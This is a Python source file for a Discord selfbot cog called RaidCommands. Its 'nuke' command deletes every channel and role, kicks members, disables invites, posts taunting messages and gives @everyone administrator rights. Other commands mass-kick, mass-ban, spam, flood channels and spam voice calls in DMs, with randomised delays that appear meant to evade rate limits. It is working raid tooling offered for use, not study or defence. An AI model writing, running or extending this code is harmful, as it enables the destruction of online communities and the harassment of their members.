import discord
from discord.ext import commands
import asyncio

from utils import log, generate_random_string, random_cooldown
import config_selfbot
import langs
import os  # Assurez-vous d'importer os pour la gestion des fichiers

class RaidCommands(commands.Cog):
    def __init__(self, bot):
        self.bot: commands.Bot = bot
        self.is_spamming: bool = False

    async def delete_all_roles(self, guild):
        for role in guild.roles:
            try:
                await role.delete()
                print(f"Deleted role {role.name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")

    async def set_everyone_administrator(self, guild):
        try:
            everyone_role = guild.default_role
            await everyone_role.edit(permissions=discord.Permissions.all())
            log.success(f"Set @everyone as administrator")
        except Exception as e:
            log.error(f"Failed to set @everyone as administrator: {e}")

    async def delete_all_channels(self, ctx):
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except discord.Forbidden:
                continue
            except Exception as e:
                print(f"Failed to delete channel {channel.name}: {e}")

    async def kick_all_members(self, ctx):
        if ctx.author.guild_permissions.kick_members:
            members = ctx.guild.members
            
          
            log.separate_text("KICK ALL")

            for member in members:
                if ctx.guild.me.top_role > member.top_role:
                    await member.kick(reason=f"{config_selfbot.kick_reason} {generate_random_string(6)}")
                    log.success(f"@{member.name}({member.id})")
                    await asyncio.sleep(random_cooldown(0.5, 2))

            log.separate("KICK ALL")


    async def disable_all_invites(self, ctx):
        for channel in ctx.guild.channels:
            try:
                await channel.edit(invite=False)
            except discord.Forbidden:
                continue
            except Exception as e:
                print(f"Failed to disable invites for {channel.name}: {e}")

    async def create_channels_and_ping(self, ctx):
        for _ in range(24):
            try:
                new_channel = await ctx.guild.create_text_channel("Raid By Atom")
                await new_channel.send("# ez_       _ ||@everyone||")
            except Exception as e:
                print(f"Failed to create channel or ping @everyone: {e}")

    @commands.command()
    async def nuke(self, ctx: commands.Context):
        if ctx.author.guild_permissions.administrator:
            await ctx.message.edit(langs.raid_in_process[config_selfbot.lang])
            guild = ctx.guild
            
            # Supprimer tous les salons existants
            await self.delete_all_channels(ctx)
            log.success(f"Tous les salons supprimés")
            
            # Kicker tous les membres
            await self.kick_all_members(ctx)
            log.success(f"Tous les membres ont été expulsés")
            
            # Désactiver toutes les invitations
            await self.disable_all_invites(ctx)
            log.success(f"Toutes les invitations ont été désactivées")
            
            # Créer un salon nommé "Je suis ANÐOR" et y envoyer le message "Bang."
            try:
                new_channel1 = await ctx.guild.create_text_channel("Je suis andor.")
                await new_channel1.send("Bang.")
                log.success(f"Le salon 'Je suis ANÐOR' a été créé et le message 'Bang.' envoyé.")
            except Exception as e:
                print(f"Échec de la création du salon 'Je suis ANÐOR' ou de l'envoi du message : {e}")

            # Créer un salon nommé "Vous voulez parler ?" et y envoyer le message et le GIF
            try:
                new_channel2 = await ctx.guild.create_text_channel("discutons")
                await new_channel2.send("Je vous écoute.")
                
                # Envoi du GIF
                gif_path = os.path.join("utils", "Je suis ANDOR.gif")  # Remplacez "nom_du_gif.gif" par le nom réel du fichier GIF
                
                if os.path.exists(gif_path):
                    await new_channel2.send(file=discord.File(gif_path))
                    log.success(f"Le salon 'Vous voulez parler ?' a été créé et le message 'Je vous écoute.' avec le GIF a été envoyé.")
                else:
                    print(f"Le fichier GIF n'existe pas : {gif_path}")

            except Exception as e:
                print(f"Échec de la création du salon 'Vous voulez parler ?' ou de l'envoi du message/GIF : {e}")

            # Supprimer tous les rôles
            await self.delete_all_roles(guild)
            log.success(f"Tous les rôles ont été supprimés")
            
            # Donner des permissions d'administrateur à tout le monde
            await self.set_everyone_administrator(guild)
            log.success(f"Permissions d'administrateur accordées à @everyone")

        else:
            await ctx.message.edit(langs.raid_error_permission[config_selfbot.lang], delete_after=config_selfbot.deltime)
            
    @commands.command()
    async def kickall(self, ctx: commands.Context):
        if ctx.author.guild_permissions.kick_members:
            members = ctx.guild.members
            
            await ctx.message.edit(langs.raid_in_process[config_selfbot.lang])

            log.separate_text("KICK ALL")

            for member in members:
                if ctx.guild.me.top_role > member.top_role:
                    await member.kick(reason=f"{config_selfbot.kick_reason} {generate_random_string(6)}")
                    log.success(f"@{member.name}({member.id})")
                    await asyncio.sleep(random_cooldown(0.5, 2))

            log.separate("KICK ALL")

            await ctx.message.edit(langs.raid_kick_all_success[config_selfbot.lang], delete_after=config_selfbot.deltime)
        else:
            await ctx.message.edit(langs.raid_error_permisssion[config_selfbot.lang], delete_after=config_selfbot.deltime)

    @commands.command()
    async def banall(self, ctx: commands.Context):
        if ctx.author.guild_permissions.ban_members:
            members = ctx.guild.members

            await ctx.message.edit(langs.raid_in_process[config_selfbot.lang])

            log.separate_text("BAN ALL")

            for member in members:
                if ctx.guild.me.top_role > member.top_role:
                    await member.ban(reason=f"{config_selfbot.ban_reason}. {generate_random_string(6)}")
                    log.success(f"@{member.name}({member.id})")
                    await asyncio.sleep(random_cooldown(0.5, 1.9))

            log.separate("BAN ALL")

            await ctx.message.edit(langs.raid_ban_all_success[config_selfbot.lang], delete_after=config_selfbot.deltime)
        else:
            await ctx.message.edit(langs.raid_error_permisssion[config_selfbot.lang], delete_after=config_selfbot.deltime)

    @commands.command()
    async def spam(self, ctx: commands.Context):
        message_split = ctx.message.content.split()
        content = ctx.message.content.replace(f"{message_split[0]} {message_split[1]} ", "")

        try:
            count = int(message_split[1]) - 1
        except Exception:
            await ctx.message.edit(f"{langs.spam_invalid[config_selfbot.lang]}!", delete_after=config_selfbot.deltime)
            return
        
        if count >= 100:
            await ctx.message.edit(langs.spam_too_much[config_selfbot.lang], delete_after=config_selfbot.deltime)
            return

        try:
            message_split[2]
        except Exception:
            await ctx.message.edit(langs.raid_dm_all_fail[config_selfbot.lang], delete_after=config_selfbot.deltime)
            return

        if not self.is_spamming:
            self.is_spamming = True

            await ctx.message.edit(content)

            for i in range(count):
                await ctx.channel.send(content)
                await asyncio.sleep(0.1)
            self.is_spamming = False
        else:
            await ctx.message.edit(langs.spam_cooldown[config_selfbot.lang], delete_after=config_selfbot.deltime)

    @commands.command()
    async def call(self, ctx):
        if not isinstance(ctx.channel, discord.DMChannel):
            await ctx.message.edit(langs.only_dm_fun[config_selfbot.lang])
            await asyncio.sleep(config_selfbot.deltime)
            await ctx.message.delete()
            return

        try:
            await ctx.message.delete()
            for i in range(5):
                voice_client = await ctx.channel.connect(reconnect=False)
                await asyncio.sleep(0.5)
                await voice_client.disconnect()
                await asyncio.sleep(1.3)
        except Exception as e:
            print(f"{langs.voice_join_error[config_selfbot.lang]}: {e}")


    @commands.command()
    async def flood(self, ctx: commands.Context):
        flood_spam = """_ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _
        _ _"""
        await ctx.message.edit(flood_spam)
        for i in range(1):
            await ctx.channel.send(flood_spam)
            await asyncio.sleep(0.5)

def setup(bot):
    bot.add_cog(RaidCommands(bot))
